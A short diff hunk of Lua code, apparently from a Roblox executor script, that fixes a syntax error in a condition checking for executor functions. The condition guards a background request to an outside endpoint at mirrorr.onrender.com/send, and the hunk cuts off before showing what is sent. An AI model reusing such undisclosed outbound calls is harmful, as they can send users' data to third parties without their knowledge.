@@ -79,7 +79,7 @@ mirror("https://example.com")
 Loaded = true
 GUI.Hint_00:Destroy()
 
-if (writefile) and (getcustomasset) and then
+if (writefile) and (getcustomasset) then
 	coroutine.wrap(function()
 		local message = request({
 			Url = "https://mirrorr.onrender.com/send",
